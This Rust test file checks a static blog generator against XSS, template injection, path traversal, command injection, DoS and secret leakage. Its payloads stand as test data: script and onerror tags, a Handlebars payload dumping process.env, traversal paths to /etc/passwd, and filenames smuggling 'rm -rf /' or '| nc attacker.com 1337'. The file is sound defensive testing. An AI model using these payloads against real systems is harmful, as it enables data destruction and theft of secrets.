use std::fs;
use std::path::Path;
use std::process::Command;
use tempfile::TempDir;

#[test]
#[ignore = "Security tests are ignored by default. Run explicitly with `cargo test -- --ignored`. "]
fn test_input_validation_against_xss() {
    let temp_dir = TempDir::new().expect("Failed to create temp directory");
    let temp_path = temp_dir.path();

    create_minimal_config(temp_path);

    // Create content with potential XSS payload
    let malicious_content = r#"---
title: "<script>alert('XSS')</script>"
description: "Test article with XSS payload"
---

# Test Article

<script>alert('XSS')</script>

Some content with <img src="x" onerror="alert('XSS')">
"#;

    fs::write(
        temp_path.join("contents/2025-01-01-xss-test.md"),
        malicious_content,
    )
    .expect("Failed to write malicious content");

    let output = Command::new("cargo")
        .args(["run", "build"])
        .current_dir(temp_path)
        .output()
        .expect("Failed to execute build command");

    assert!(output.status.success(), "Build failed with XSS content");

    // Check that output is properly escaped
    let index_html = fs::read_to_string(temp_path.join("build/index.html"))
        .expect("Failed to read generated HTML");

    assert!(
        !index_html.contains("<script>alert('XSS')</script>"),
        "XSS script not properly escaped in title"
    );
    assert!(
        !index_html.contains("onerror=\"alert('XSS')\""),
        "XSS payload not properly escaped in content"
    );
}

#[test]
#[ignore = "Security tests are ignored by default. Run explicitly with `cargo test -- --ignored`. "]
fn test_path_traversal_protection() {
    let temp_dir = TempDir::new().expect("Failed to create temp directory");
    let temp_path = temp_dir.path();

    create_minimal_config(temp_path);

    // Try to create files with path traversal attempts
    let malicious_paths = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "../../secret.txt",
        "../outside.md",
    ];

    for malicious_path in &malicious_paths {
        let result = std::panic::catch_unwind(|| {
            fs::write(
                temp_path.join("contents").join(malicious_path),
                "Malicious content",
            )
        });

        // Should either fail to write or not affect build security
        if result.is_ok() {
            let output = Command::new("cargo")
                .args(["run", "build"])
                .current_dir(temp_path)
                .output()
                .expect("Failed to execute build command");

            // Build should succeed but not expose sensitive paths
            if output.status.success() {
                let build_files = collect_all_files(&temp_path.join("build"));
                for file in build_files {
                    let content = fs::read_to_string(&file).unwrap_or_default();
                    assert!(!content.contains("/etc/passwd"), "Sensitive path exposed");
                    assert!(!content.contains("system32"), "Sensitive path exposed");
                }
            }
        }
    }
}

#[test]
#[ignore = "Security tests are ignored by default. Run explicitly with `cargo test -- --ignored`. "]
fn test_file_permission_security() {
    let temp_dir = TempDir::new().expect("Failed to create temp directory");
    let temp_path = temp_dir.path();

    create_minimal_config(temp_path);

    let output = Command::new("cargo")
        .args(["run", "build"])
        .current_dir(temp_path)
        .output()
        .expect("Failed to execute build command");

    assert!(output.status.success(), "Build command failed");

    // Check that generated files don't have overly permissive permissions
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;

        let build_dir = temp_path.join("build");
        if build_dir.exists() {
            for entry in fs::read_dir(&build_dir).expect("Failed to read build directory") {
                let entry = entry.expect("Failed to read entry");
                let metadata = entry.metadata().expect("Failed to get metadata");
                let permissions = metadata.permissions();

                // Check that files are not world-writable
                assert_eq!(
                    permissions.mode() & 0o002,
                    0,
                    "File {} is world-writable",
                    entry.path().display()
                );

                // Check that files are not executable unless they should be
                if entry
                    .path()
                    .extension()
                    .is_some_and(|ext| ext == "html" || ext == "css")
                {
                    assert_eq!(
                        permissions.mode() & 0o111,
                        0,
                        "HTML/CSS file {} is executable",
                        entry.path().display()
                    );
                }
            }
        }
    }
}

#[test]
#[ignore = "Security tests are ignored by default. Run explicitly with `cargo test -- --ignored`. "]
fn test_template_injection_protection() {
    let temp_dir = TempDir::new().expect("Failed to create temp directory");
    let temp_path = temp_dir.path();

    create_minimal_config(temp_path);

    // Create content with template injection attempts
    let injection_content = r#"---
title: "{{#each users}}{{name}}{{/each}}"
description: "{{constructor.constructor('alert(1)')()}}"
---

# Template Injection Test

{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return JSON.stringify(process.env);"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
"#;

    fs::write(
        temp_path.join("contents/2025-01-01-template-injection.md"),
        injection_content,
    )
    .expect("Failed to write injection content");

    let output = Command::new("cargo")
        .args(["run", "build"])
        .current_dir(temp_path)
        .output()
        .expect("Failed to execute build command");

    // Build should succeed but template injection should be neutralized
    assert!(
        output.status.success(),
        "Build failed with template injection"
    );

    // Check that dangerous template constructs are not executed
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        !stderr.contains("process.env"),
        "Template injection may have executed"
    );

    if temp_path
        .join("build/2025-01-01-template-injection.html")
        .exists()
    {
        let generated_html =
            fs::read_to_string(temp_path.join("build/2025-01-01-template-injection.html"))
                .expect("Failed to read generated HTML");

        assert!(
            !generated_html.contains("JSON.stringify"),
            "Template injection executed"
        );
        assert!(
            !generated_html.contains("process.env"),
            "Template injection executed"
        );
    }
}

#[test]
#[ignore = "Security tests are ignored by default. Run explicitly with `cargo test -- --ignored`. "]
fn test_command_injection_protection() {
    let temp_dir = TempDir::new().expect("Failed to create temp directory");
    let temp_path = temp_dir.path();

    create_minimal_config(temp_path);

    // Test resize command with malicious filename
    let malicious_filenames = [
        "image.jpg; rm -rf /",
        "image.jpg && cat /etc/passwd",
        "image.jpg | nc attacker.com 1337",
        "$(whoami).jpg",
        "`id`.jpg",
    ];

    for filename in &malicious_filenames {
        // Create a harmless image file with malicious name (if possible)
        let safe_filename = filename.replace(['/', '\\', '|', ';', '&', '$', '`'], "_");
        let image_path = temp_path.join("public/images").join(&safe_filename);

        if let Ok(()) = fs::create_dir_all(image_path.parent().unwrap()) {
            if fs::write(&image_path, b"fake image content").is_ok() {
                let output = Command::new("cargo")
                    .args(["run", "resize", &format!("public/images/{safe_filename}")])
                    .current_dir(temp_path)
                    .output()
                    .expect("Failed to execute resize command");

                // Command should either fail safely or succeed without executing injection
                let stderr = String::from_utf8_lossy(&output.stderr);
                let stdout = String::from_utf8_lossy(&output.stdout);

                assert!(
                    !stderr.contains("etc/passwd"),
                    "Command injection may have occurred"
                );
                assert!(
                    !stderr.contains("whoami"),
                    "Command injection may have occurred"
                );
                assert!(
                    !stdout.contains("root:"),
                    "Command injection may have occurred"
                );
            }
        }
    }
}

#[test]
fn test_information_disclosure_protection() {
    let temp_dir = TempDir::new().expect("Failed to create temp directory");
    let temp_path = temp_dir.path();

    create_minimal_config(temp_path);

    // Create sensitive files that should not be exposed
    fs::write(temp_path.join(".env"), "SECRET_KEY=super_secret").expect("Failed to write .env");
    fs::write(temp_path.join("config.json"), r#"{"api_key": "secret123"}"#)
        .expect("Failed to write config");

    // Run generator directly instead of spawning an external cargo process.
    // This keeps the test self-contained and avoids shelling out during tests.
    let build_dir = temp_path.join("build");
    let contents_dir = temp_path.join("contents");

    match crate::generator::Generator::new(&build_dir, &contents_dir) {
        Ok(generator) => {
            if let Err(e) = generator.generate() {
                panic!("Build failed: {e}");
            }
        }
        Err(e) => panic!("Failed to initialize generator: {e}"),
    }

    // Check that sensitive files are not copied to build directory
    let build_dir = temp_path.join("build");
    assert!(
        !build_dir.join(".env").exists(),
        "Sensitive .env file copied to build"
    );
    assert!(
        !build_dir.join("config.json").exists(),
        "Sensitive config file copied to build"
    );

    // Check that sensitive information is not leaked in generated files
    let html_files = collect_html_files(&build_dir);
    for html_file in html_files {
        let content = fs::read_to_string(&html_file).expect("Failed to read HTML file");
        assert!(
            !content.contains("super_secret"),
            "Secret leaked in {}",
            html_file.display()
        );
        assert!(
            !content.contains("secret123"),
            "API key leaked in {}",
            html_file.display()
        );
        assert!(
            !content.contains("SECRET_KEY"),
            "Environment variable leaked in {}",
            html_file.display()
        );
    }
}

#[test]
#[ignore = "Security tests are ignored by default. Run explicitly with `cargo test -- --ignored`. "]
fn test_denial_of_service_protection() {
    let temp_dir = TempDir::new().expect("Failed to create temp directory");
    let temp_path = temp_dir.path();

    create_minimal_config(temp_path);

    // Create content that could cause DoS
    let mut dos_content = String::from(
        r#"---
title: "DoS Test Article"
description: "Article designed to test DoS protection"
---

# DoS Test

"#,
    );

    // Add deeply nested structure
    for i in 0..100 {
        dos_content.push_str(&format!(
            "{} Level {} heading\n",
            "#".repeat((i % 6) + 1),
            i
        ));
        dos_content.push_str("Content that repeats many times. ");
    }

    fs::write(
        temp_path.join("contents/2025-01-01-dos-test.md"),
        dos_content,
    )
    .expect("Failed to write DoS content");

    use std::time::{Duration, Instant};
    let start = Instant::now();

    let output = Command::new("cargo")
        .args(["run", "build"])
        .current_dir(temp_path)
        .output()
        .expect("Failed to execute build command");

    let duration = start.elapsed();

    // Build should complete within reasonable time (30 seconds max)
    assert!(
        duration < Duration::from_secs(30),
        "Build took too long ({}s), possible DoS vulnerability",
        duration.as_secs()
    );

    // Should either succeed or fail gracefully
    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        assert!(!stderr.contains("memory"), "Possible memory exhaustion");
        assert!(
            !stderr.contains("stack overflow"),
            "Possible stack overflow"
        );
    }
}

#[test]
#[ignore = "Security tests are ignored by default. Run explicitly with `cargo test -- --ignored`. "]
fn test_server_security_headers() {
    // This test would need to actually start the server and check headers
    // For now, we'll test that the server starts without exposing sensitive info
    let temp_dir = TempDir::new().expect("Failed to create temp directory");
    let temp_path = temp_dir.path();

    create_minimal_config(temp_path);

    // Build first
    let build_output = Command::new("cargo")
        .args(["run", "build"])
        .current_dir(temp_path)
        .output()
        .expect("Failed to execute build command");

    assert!(build_output.status.success(), "Build command failed");

    // Test that server startup doesn't leak information
    let server_output = Command::new("timeout")
        .args(["2", "cargo", "run", "start"])
        .current_dir(temp_path)
        .output();

    if let Ok(output) = server_output {
        let stdout = String::from_utf8_lossy(&output.stdout);
        let stderr = String::from_utf8_lossy(&output.stderr);

        // Check that no sensitive information is logged
        assert!(
            !stdout.contains("password"),
            "Password leaked in server output"
        );
        assert!(!stdout.contains("secret"), "Secret leaked in server output");
        assert!(!stderr.contains("panic"), "Panic information leaked");
    }
}

// Helper functions

fn create_minimal_config(temp_path: &Path) {
    fs::create_dir_all(temp_path.join("contents")).expect("Failed to create contents directory");
    fs::create_dir_all(temp_path.join("source/templates"))
        .expect("Failed to create templates directory");
    fs::create_dir_all(temp_path.join("public")).expect("Failed to create public directory");

    if Path::new("Cargo.toml").exists() {
        fs::copy("Cargo.toml", temp_path.join("Cargo.toml")).expect("Failed to copy Cargo.toml");
    }

    if Path::new("app.toml").exists() {
        fs::copy("app.toml", temp_path.join("app.toml")).expect("Failed to copy app.toml");
    }

    if Path::new("src").exists() {
        copy_dir_all("src", temp_path.join("src")).expect("Failed to copy src directory");
    }

    // Create minimal templates
    let template = r#"<!DOCTYPE html>
<html>
<head>
    <title>{{title}}</title>
    <meta name="description" content="{{description}}">
</head>
<body>
    <h1>{{title}}</h1>
    <div>{{description}}</div>
</body>
</html>"#;

    fs::write(temp_path.join("source/templates/index.html"), template)
        .expect("Failed to write template");

    let index_yml = r#"title: "Security Test Blog"
description: "A blog for security testing"
image: ""
"#;
    fs::write(temp_path.join("contents/index.yml"), index_yml).expect("Failed to write index.yml");
}

fn copy_dir_all(src: impl AsRef<Path>, dst: impl AsRef<Path>) -> std::io::Result<()> {
    fs::create_dir_all(&dst)?;
    for entry in fs::read_dir(src)? {
        let entry = entry?;
        let ty = entry.file_type()?;
        if ty.is_dir() {
            copy_dir_all(entry.path(), dst.as_ref().join(entry.file_name()))?;
        } else {
            fs::copy(entry.path(), dst.as_ref().join(entry.file_name()))?;
        }
    }
    Ok(())
}

fn collect_all_files(dir: &Path) -> Vec<std::path::PathBuf> {
    let mut files = Vec::new();
    if let Ok(entries) = fs::read_dir(dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            if path.is_file() {
                files.push(path);
            } else if path.is_dir() {
                files.extend(collect_all_files(&path));
            }
        }
    }
    files
}

fn collect_html_files(dir: &Path) -> Vec<std::path::PathBuf> {
    collect_all_files(dir)
        .into_iter()
        .filter(|path| path.extension().is_some_and(|ext| ext == "html"))
        .collect()
}
